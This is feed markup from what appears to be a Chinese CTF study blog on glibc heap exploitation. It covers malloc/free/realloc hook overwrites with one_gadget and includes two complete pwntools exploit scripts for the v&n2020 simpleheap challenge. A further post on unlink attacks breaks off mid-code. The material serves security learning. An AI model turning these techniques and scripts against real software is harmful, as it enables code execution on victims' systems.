        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在调用malloc或者free的时候，如果 <strong>malloc_hook 和free_hook的值存在</strong>，<strong>则会调用malloc_hook或者free_hook指向的地址</strong>，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell</p><ul><li>malloc_hook位于main_arena下方的位置(绝大多时候是-0x10)，可以通过fake chunk来overwrite该值实现getshell</li><li>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</li></ul><h1 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="malloc_hook利用"></a>malloc_hook利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li></ul><h1 id="free-hook利用"><a href="#free-hook利用" class="headerlink" title="free_hook利用"></a>free_hook利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>利用思路：<ul><li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li><li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li><li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li></ul></li></ul><h1 id="realloc-hook与malloc-hook的联合利用"><a href="#realloc-hook与malloc-hook的联合利用" class="headerlink" title="realloc_hook与malloc_hook的联合利用"></a>realloc_hook与malloc_hook的联合利用</h1><p>因为</p><p>realloc_hook与malloc_hook 相似是一个弱类型的指针.在调用realloc()函数是会判断realloc_hook的值是否为空,不为空则执行其执行的代码.这是realloc_hook的一种用法。</p><p>大多时候在执行onegadget时,并不容易满足限制条件,故而可以利用realloc()来调整栈帧以满足条件</p><p>即可以用malloc_hook来指向_libc_realloc()函数内部(即强行调用realloc())然后通过realloc_hook来触发one_gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000009</span>AE84 <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:<span class="number">000000000009</span>AE86 <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:<span class="number">000000000009</span>AE88 <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:<span class="number">000000000009</span>AE8A <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">000000000009</span>AE8C <span class="number">49</span> <span class="number">89</span> F4                      mov     r12, rsi</span><br><span class="line">.text:<span class="number">000000000009</span>AE8F <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">000000000009</span>AE90 <span class="number">48</span> <span class="number">89</span> FD                      mov     rbp, rdi</span><br><span class="line">.text:<span class="number">000000000009</span>AE93 <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:<span class="number">000000000009</span>AE94 <span class="number">48</span> <span class="number">83</span> EC <span class="number">18</span>                   sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000009</span>AE98 <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> <span class="number">41</span> <span class="number">11</span> <span class="number">15</span> <span class="number">00</span>          mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">000000000009</span>AE9F <span class="number">48</span> <span class="number">8B</span> <span class="number">00</span>                      mov     rax, [rax]</span><br><span class="line">.text:<span class="number">000000000009</span>AEA2 <span class="number">48</span> <span class="number">85</span> C0                      test    rax, rax</span><br><span class="line">.text:<span class="number">000000000009</span>AEA5 <span class="number">0F</span> <span class="number">85</span> <span class="number">35</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_9B0E0</span><br></pre></td></tr></table></figure><p><code>malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</code></p><p>我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作”微调”rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。</p><p><strong>此外符号__malloc_hook与__realloc_hook在数据段中是相邻的,realloc在前</strong></p><p><strong>__free_hook的位置与前二者不相邻</strong></p><p>不过<em>_malloc_hook_ptr和\</em>_free_hook_ptr倒是相邻的</p><p>参数也有差异,_malloc_hook与__realloc_hook的参数为申请的chunk的大小</p><p>__free_hook的参数则为释放的chunk的地址</p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-1</title>
      <link href="/posts/61329/"/>
      <url>/posts/61329/</url>
      
        <content type="html"><![CDATA[<span class='p blue h4'>四个基础漏洞，其他利用方式大多要用到它们</span><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p><strong>unlink宏</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>对于非largebin来说有两次检查</p><p>可以看到<code>unlink()</code>函数首先检查当前 chunk 的 size 和下一个 chunk 的 prev_size 是否相等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查后一个 chunk 的 bk 和前一个 chunk 的 fd 是否指向当前 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != p || BK-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>本节只是简要的过一遍流程,这部分知识网上很全,学习过程中一定要注意讲解中提到的指针和地址的区别(虽然指针和地址其实是一个东西)</strong></p><p>我们先假设伪造了一个 fake chunk 可以成功利用 unlink。这时我们可以通过溢出的方式将某个 chunk 的 prev_size 改写成这个 chunk 到 fake chunk 的距离，并将 size 的 P 位改成 0，然后对该 chunk 进行<code>free()</code>，就触发了后向合并，此时会对 fake chunk 进行 unlink。</p><p>我们如何利用 unlink 呢？我们伪造的 fake chunk 需要满足<code>FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p</code>，才能让<code>FD-&gt;bk = BK;BK-&gt;fd = FD;</code>。如果我们有一个指向 fake chunk 的指针的地址时好像就有办法了。我们先设指向 fake chunk 的指针为<code>ptr</code>，然后构造一个这样的 fake chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">bk = &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>此时的FD和BK:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD == &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">BK == &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>在 unlink 执行检查时，发现满足条件，成功通过检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk == *(&amp;ptr<span class="number">-0x18</span>+<span class="number">0x18</span>) == p;</span><br><span class="line">BK-&gt;fd == *(&amp;ptr<span class="number">-0x10</span>+<span class="number">0x10</span>) == p;</span><br></pre></td></tr></table></figure><p>执行 unlink，最后<code>ptr</code>指向<code>&amp;ptr-0x18</code>处的位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FD-&gt;bk = BK</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x10;</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x10</span>;</span><br><span class="line"><span class="comment">// BK-&gt;fd = FD</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x18</span></span><br><span class="line">ptr = &amp;ptr<span 